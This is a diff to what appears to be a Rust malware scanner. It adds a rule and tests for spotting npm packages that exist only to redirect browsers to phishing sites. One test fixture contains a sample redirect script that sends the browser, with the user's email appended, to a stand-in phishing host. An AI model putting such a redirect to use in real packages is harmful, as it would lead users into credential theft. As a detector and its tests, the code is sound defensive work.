@@ -15,6 +15,7 @@ use crate::scanner::{
 use crate::RuleMatch;
 use regex::Regex;
 use std::collections::{BTreeMap, HashSet};
+use std::path::Path;
 use std::sync::LazyLock;
 
 pub const CHAIN_PREFIX: &str = "Chain: ";
@@ -35,6 +36,7 @@ pub const AI_TRAFFIC_HIJACK: &str = "Chain: AI API Traffic Hijack";
 pub const NPM_SPAM: &str = "Chain: Registry Spam Publisher";
 pub const OBFUSCATED_RECON: &str = "Chain: Obfuscated Reconnaissance";
 pub const RANSOMWARE: &str = "Chain: Ransomware";
+pub const PHISHING_REDIRECT: &str = "Chain: Phishing Redirect Package";
 /// Emitted by `cve::own_package_matches` for versions like 99.0.0 / 999.9.9.
 pub const DEP_CONFUSION_VERSION: &str = "Dependency Confusion Version";
 
@@ -417,6 +419,71 @@ fn remote_file_write(matches: &[&RuleMatch]) -> Vec<RuleMatch> {
     }]
 }
 
+static NAVIGATION: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"\blocation(?:\.href)?\s*=[^=]|\blocation\.(?:replace|assign)\s*\(").unwrap()
+});
+static URL_LITERAL: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"["'`](https?://[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+[^"'`\s]*)"#).unwrap()
+});
+/// A library has more code than this; a redirect page has one or two scripts.
+const MAX_REDIRECT_SCRIPTS: usize = 3;
+
+/// An npm package that is no library: no dependencies, a handful of small
+/// scripts, and one of them sends the browser to a hard-coded site. Phishing
+/// kits publish these to serve the redirect from unpkg or jsDelivr
+/// (`redirect-p8ris1`, `1uniswapinterface`). No single line in them is
+/// malicious, so no rule fires; the shape of the package is the finding.
+pub fn redirect_package(root: &Path) -> Option<RuleMatch> {
+    let manifest = std::fs::read_to_string(root.join("package.json")).ok()?;
+    let manifest: serde_json::Value = serde_json::from_str(&manifest).ok()?;
+    let has_deps = manifest["dependencies"]
+        .as_object()
+        .is_some_and(|d| !d.is_empty());
+    // An extension's webview may navigate; it is not served from a CDN.
+    if has_deps || manifest["engines"]["vscode"].is_string() {
+        return None;
+    }
+    let scripts: Vec<_> = walkdir::WalkDir::new(root)
+        .max_depth(3)
+        .into_iter()
+        .flatten()
+        .filter(|e| e.file_type().is_file())
+        .map(|e| e.into_path())
+        .filter(|p| !p.components().any(|c| c.as_os_str() == "node_modules"))
+        .filter(|p| {
+            p.extension()
+                .and_then(|x| x.to_str())
+                .is_some_and(|x| ["js", "mjs", "cjs"].contains(&x))
+        })
+        .take(MAX_REDIRECT_SCRIPTS + 1)
+        .collect();
+    if scripts.len() > MAX_REDIRECT_SCRIPTS {
+        return None;
+    }
+    scripts.iter().find_map(|path| {
+        if path.metadata().ok()?.len() > NEAR as u64 {
+            return None;
+        }
+        let text = std::fs::read_to_string(path).ok()?;
+        let nav = NAVIGATION.find(&text)?;
+        let url = URL_LITERAL.captures(&text)?;
+        Some(RuleMatch {
+            file_path: path
+                .strip_prefix(root)
+                .unwrap_or(path)
+                .to_string_lossy()
+                .to_string(),
+            line_number: text[..nav.start()].matches('\n').count() + 1,
+            matched_pattern: PHISHING_REDIRECT.to_string(),
+            severity: "critical".to_string(),
+            context: format!(
+                "Package without dependencies whose script sends the browser to {}",
+                &url[1]
+            ),
+        })
+    })
+}
+
 fn chain(rel_path: &str, name: &str, a: &RuleMatch, b: &RuleMatch) -> RuleMatch {
     RuleMatch {
         file_path: rel_path.to_string(),
@@ -433,6 +500,51 @@ fn chain(rel_path: &str, name: &str, a: &RuleMatch, b: &RuleMatch) -> RuleMatch 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn package_that_only_redirects_the_browser() {
+        let dir = tempfile::tempdir().unwrap();
+        let write = |name: &str, text: &str| std::fs::write(dir.path().join(name), text).unwrap();
+        write(
+            "package.json",
+            r#"{"name":"redirect-x","version":"1.0.0","main":"go.js"}"#,
+        );
+        write(
+            "go.js",
+            "function go() {\n  var u = \"https://login.example-phish.com/a\";\n  window.location.href = u + \"#\" + email;\n}\ngo();\n",
+        );
+        let found = redirect_package(dir.path()).expect("redirect package");
+        assert_eq!(found.matched_pattern, PHISHING_REDIRECT);
+        assert_eq!((found.file_path.as_str(), found.line_number), ("go.js", 3));
+        assert!(found.context.ends_with("https://login.example-phish.com/a"));
+
+        // Reading the address is not a navigation, and a relative path is not a site.
+        write(
+            "go.js",
+            "if (location.href == 'https://a.example.com') {}\n",
+        );
+        assert!(redirect_package(dir.path()).is_none());
+        write("go.js", "location.href = '/login';\n");
+        assert!(redirect_package(dir.path()).is_none());
+
+        // A library that redirects somewhere (an OAuth helper) has dependencies.
+        write(
+            "go.js",
+            "window.location.href = 'https://accounts.example.com/authorize';\n",
+        );
+        assert!(redirect_package(dir.path()).is_some());
+        write(
+            "package.json",
+            r#"{"name":"oauth-x","dependencies":{"qs":"6.0.0"}}"#,
+        );
+        assert!(redirect_package(dir.path()).is_none());
+        // And so does a VS Code extension's webview script.
+        write(
+            "package.json",
+            r#"{"name":"ext","engines":{"vscode":"^1.80.0"}}"#,
+        );
+        assert!(redirect_package(dir.path()).is_none());
+    }
 
     fn hit(file: &str, rule: &str, line: usize) -> RuleMatch {
         RuleMatch {
